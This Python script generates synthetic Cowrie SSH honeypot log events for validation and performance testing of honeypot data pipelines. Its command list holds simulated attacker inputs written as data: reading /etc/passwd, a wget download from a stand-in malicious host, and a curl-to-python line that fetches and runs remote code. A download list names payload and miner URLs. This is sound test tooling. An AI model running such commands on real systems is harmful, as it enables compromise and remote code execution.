#!/usr/bin/env python3
"""Generate synthetic Cowrie JSON events for validation and performance tests."""

from __future__ import annotations

import argparse
import gzip
import json
import random
import sys
import uuid
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Iterable, TextIO, cast

COMMANDS = [
    "uname -a",
    "cat /etc/passwd",
    "wget http://malicious.example/payload.sh",
    "curl -fsSL http://10.0.0.99/dropper.py | python",
    "echo 'test' > /tmp/probe.txt",
]

DOWNLOAD_URLS = [
    "http://malicious.example/payload.sh",
    "http://malicious.example/miner.bin",
    "http://10.0.0.42/scan.py",
]

PASSWORDS = ["root", "123456", "password", "admin"]


def _choose(sequence: Iterable[str], default: str) -> str:
    seq = list(sequence)
    if not seq:
        return default
    return random.choice(seq)


def _write_line(handle: TextIO, payload: dict) -> None:
    handle.write(json.dumps(payload, separators=(",", ":")))
    handle.write("\n")


def _session_records(
    session_id: str,
    sensor: str,
    src_ip: str,
    base_time: datetime,
    commands: int,
    downloads: int,
) -> list[dict]:
    records: list[dict] = []
    ts = base_time

    def next_ts() -> str:
        nonlocal ts
        ts = ts + timedelta(seconds=random.randint(1, 10))
        return ts.isoformat().replace("+00:00", "Z")

    records.append(
        {
            "session": session_id,
            "eventid": "cowrie.session.connect",
            "protocol": "ssh",
            "sensor": sensor,
            "src_ip": src_ip,
            "timestamp": ts.isoformat().replace("+00:00", "Z"),
        }
    )

    records.append(
        {
            "session": session_id,
            "eventid": "cowrie.login.failed",
            "sensor": sensor,
            "username": "root",
            "password": _choose(PASSWORDS, "password"),
            "src_ip": src_ip,
            "timestamp": next_ts(),
        }
    )

    records.append(
        {
            "session": session_id,
            "eventid": "cowrie.login.success",
            "sensor": sensor,
            "username": "root",
            "password": _choose(PASSWORDS, "password"),
            "src_ip": src_ip,
            "timestamp": next_ts(),
        }
    )

    for _ in range(commands):
        command = _choose(COMMANDS, "echo test")
        records.append(
            {
                "session": session_id,
                "eventid": "cowrie.command.input",
                "sensor": sensor,
                "input": command,
                "timestamp": next_ts(),
            }
        )

    for _ in range(downloads):
        url = _choose(DOWNLOAD_URLS, "http://example.invalid/file")
        records.append(
            {
                "session": session_id,
                "eventid": "cowrie.session.file_download",
                "sensor": sensor,
                "url": url,
                "outfile": f"/tmp/{uuid.uuid4().hex}.bin",
                "timestamp": next_ts(),
            }
        )

    records.append(
        {
            "session": session_id,
            "eventid": "cowrie.session.closed",
            "sensor": sensor,
            "timestamp": next_ts(),
        }
    )

    return records


def _open_output(path: Path) -> TextIO:
    if path.suffix == ".gz":
        return cast(TextIO, gzip.open(path, "wt", encoding="utf-8"))
    return path.open("w", encoding="utf-8")


def main(argv: list[str] | None = None) -> int:
    """CLI entry point for synthetic Cowrie event generation."""
    parser = argparse.ArgumentParser(description="Generate synthetic Cowrie JSON events")
    parser.add_argument("output", help="Path to JSON lines file (append .gz for gzip)")
    parser.add_argument("--sessions", type=int, default=500, help="Number of sessions to emit")
    parser.add_argument(
        "--commands-per-session", type=int, default=3, help="Command events per session"
    )
    parser.add_argument(
        "--downloads-per-session", type=int, default=1, help="File downloads per session"
    )
    parser.add_argument(
        "--sensor",
        action="append",
        dest="sensors",
        help="Sensor name to cycle through (use multiple times)",
    )
    parser.add_argument(
        "--start",
        default=datetime.now(UTC).isoformat(),
        help="ISO timestamp for first session (defaults to now UTC)",
    )
    parser.add_argument(
        "--seed", type=int, default=None, help="Random seed for reproducibility"
    )
    args = parser.parse_args(argv)

    if args.seed is not None:
        random.seed(args.seed)

    try:
        start_ts = datetime.fromisoformat(args.start.replace("Z", "+00:00"))
    except ValueError as exc:
        parser.error(f"invalid --start value: {exc}")
        return 2

    sensors = args.sensors or ["honeypot-a"]
    output_path = Path(args.output)
    output_path.parent.mkdir(parents=True, exist_ok=True)

    total_events = 0
    with _open_output(output_path) as handle:
        for index in range(args.sessions):
            session_id = uuid.uuid4().hex
            sensor = sensors[index % len(sensors)]
            src_ip = f"198.51.100.{(index % 200) + 1}"
            base_time = start_ts + timedelta(minutes=index // len(sensors))
            events = _session_records(
                session_id,
                sensor,
                src_ip,
                base_time,
                args.commands_per_session,
                args.downloads_per_session,
            )
            for payload in events:
                _write_line(handle, payload)
            total_events += len(events)

    print(
        json.dumps(
            {
                "output": str(output_path),
                "sessions": args.sessions,
                "events": total_events,
                "sensors": sensors,
            },
            indent=2,
        )
    )
    return 0


if __name__ == "__main__":  # pragma: no cover
    sys.exit(main())
